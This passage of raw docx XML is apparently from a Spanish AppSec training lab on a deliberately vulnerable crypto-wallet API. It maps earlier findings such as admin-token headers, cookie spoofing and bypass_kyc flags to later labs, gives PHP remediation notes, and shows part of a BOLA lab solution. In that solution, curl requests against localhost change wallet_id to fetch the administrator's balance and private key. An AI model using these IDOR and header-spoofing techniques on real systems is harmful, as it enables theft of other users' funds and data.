      </w:pPr>
      <w:r>
        <w:t>Como esto encadena con las siguientes fases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C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Hallazgo Fase 4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
            <w:shd w:val="clear" w:color="auto" w:fill="2C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Habilita en Fase...</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>?debug=1</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> y </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>X-Debug-Token</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Fase 5 - todos los LABs (mas info en errores)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>?as_user_id</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> y </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>as_user_id</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> body</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Fase 5 - LAB01 BOLA escalado</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>X-Admin-Token</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> y </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Cookie: internal_user=admin</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Fase 5 - LAB05 BFLA sin necesidad de JWT admin</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>rate_override</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>bypass_kyc</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>fee_override</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Fase 5 - LAB06 Business Flow</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>X-Forwarded-For</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>X-Original-URL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Fase 5 - LAB07 SSRF</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>?role=admin</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> SQLi</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Fase 5 - LAB02 Broken Auth via SQLi</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Remediacion</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[php]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>// 1. Whitelist explicita de parametros aceptados por endpoint</w:t>
        <w:br/>
        <w:t>function validateParams($input, $allowed) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $extra = array_diff(array_keys($input), $allowed);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if (!empty($extra)) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        throw new Exception('Parametros no permitidos: ' . implode(',', $extra));</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:br/>
        <w:t>// 2. NUNCA confiar en X-Forwarded-For para identificar IP "interna"</w:t>
        <w:br/>
        <w:t>//    Usarlo solo con LB que lo setee y filtrarlo en el LB</w:t>
        <w:br/>
        <w:t>function getClientIPSafe() {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return $_SERVER['REMOTE_ADDR']; // Solo esto. Punto.</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:br/>
        <w:t>// 3. Eliminar magic-tokens hardcoded. Usar mTLS o tokens firmados con expiracion.</w:t>
        <w:br/>
        <w:br/>
        <w:t>// 4. Eliminar todos los `*_override`, `bypass_*`, `skip_*` - si los necesitas</w:t>
        <w:br/>
        <w:t>//    para QA, usar un header firmado con HMAC y expiracion corta.</w:t>
        <w:br/>
        <w:br/>
        <w:t>// 5. Headers de respuesta no deben filtrar metadata interna.</w:t>
        <w:br/>
        <w:t>//    Eliminar X-Magic-Signals, X-Debug-Info, X-Server-Version.</w:t>
        <w:br/>
        <w:br/>
        <w:t>// 6. Definir el contrato API en OpenAPI con additionalProperties: false</w:t>
        <w:br/>
        <w:t>//    y validar el body con un schema validator (opis/json-schema, justinrainbow/json-schema).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Fase 5 - OWASP API Top 10</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>LAB 01 - Broken Object Level Authorization (BOLA)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Referencia OWASP: API1:2023 - Broken Object Level Authorization</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Objetivo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Explotar la falta de verificacion de propiedad de objetos en la API de CryptoVulnX para acceder a wallets, balances, claves privadas e historial de transacciones de otros usuarios sin autorizacion.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Contexto</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>La vulnerabilidad BOLA (Broken Object Level Authorization) ocurre cuando una API expone endpoints que manejan identificadores de objetos (IDs) y no verifica que el usuario autenticado sea el propietario legitimo del objeto solicitado.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">En CryptoVulnX, la API recibe parametros como </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>wallet_id</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>user_id</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> directamente del cliente y los utiliza en consultas SQL sin validar que pertenezcan al usuario autenticado. Esto permite que cualquier usuario autenticado acceda a la informacion financiera de otros usuarios simplemente modificando el valor del identificador en la peticion.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Este tipo de vulnerabilidad es extremadamente critica en plataformas fintech, ya que permite:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ver balances de wallets ajenas</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Obtener claves privadas de otros usuarios</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Consultar el historial completo de transacciones de cualquier cuenta</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Obtener el estado KYC de otros usuarios</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Endpoints Involucrados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C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Metodo</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
            <w:shd w:val="clear" w:color="auto" w:fill="2C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Endpoint</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
            <w:shd w:val="clear" w:color="auto" w:fill="2C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Descripcion</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>GET</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/v1/wallets/balance.php?wallet_id=X</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Consulta el balance de una wallet por su ID</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>GET</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/v1/wallets/history.php?wallet_id=X</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Obtiene el historial de transacciones de una wallet</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>GET</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/v1/kyc/status.php?user_id=X</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Consulta el estado de verificacion KYC de un usuario</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Dificultad</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Baja</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - Solo requiere modificar un parametro en la URL para explotar la vulnerabilidad.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Pistas</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Pista 1 - Reconocimiento</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Inicia sesion con tus credenciales y observa las peticiones que realiza la aplicacion. Presta atencion a los parametros numericos en las URLs, especialmente </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>wallet_id</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>user_id</w:t>
      </w:r>
      <w:r>
        <w:t>. ¿Que pasa si cambias esos valores?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Pista 2 - Enumeracion</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Tu wallet tiene </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>wallet_id=3</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Los IDs son secuenciales. El administrador del sistema suele ser el primer usuario registrado. ¿Cual seria el </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>wallet_id</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> del administrador?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Pista 3 - Explotacion</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Realiza peticiones GET a los endpoints de balance e historial cambiando </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>wallet_id=3</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> por </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>wallet_id=1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. La API devolvera toda la informacion de la wallet del administrador, incluyendo su </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>private_key</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> y su balance completo, sin verificar que seas el propietario.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Solucion</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Paso 1 - Autenticarse como el usuario carlos</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s -X POST http://localhost/appsec/api/v1/auth/login.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"username":"carlos","password":"carlos2024"}'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Respuesta esperada:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[json]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "status": "success",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "user_id": 3</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Paso 2 - Consultar la wallet propia (wallet_id=3)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s -X GET "http://localhost/appsec/api/v1/wallets/balance.php?wallet_id=3" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Authorization: Bearer &lt;TOKEN_OBTENIDO&gt;"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Respuesta esperada:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[json]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "wallet_id": 3,</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "user_id": 3,</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "balance": "0.05000000",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "currency": "BTC",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "address": "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Paso 3 - Explotar BOLA: Acceder a la wallet del administrador (wallet_id=1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s -X GET "http://localhost/appsec/api/v1/wallets/balance.php?wallet_id=1" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Authorization: Bearer &lt;TOKEN_OBTENIDO&gt;"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Respuesta esperada:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[json]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "wallet_id": 1,</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "user_id": 1,</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "balance": "150.75000000",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "currency": "BTC",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "address": "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "private_key": "5HueCGU8rMjxEXxiPuD5BDku4MkFqeZyd4dZ1jvhTVqvbTLvyTJ"</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>La API devuelve la clave privada y el balance completo del administrador.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Paso 4 - Acceder al historial de transacciones del administrador</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s -X GET "http://localhost/appsec/api/v1/wallets/history.php?wallet_id=1" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Authorization: Bearer &lt;TOKEN_OBTENIDO&gt;"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Respuesta esperada:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
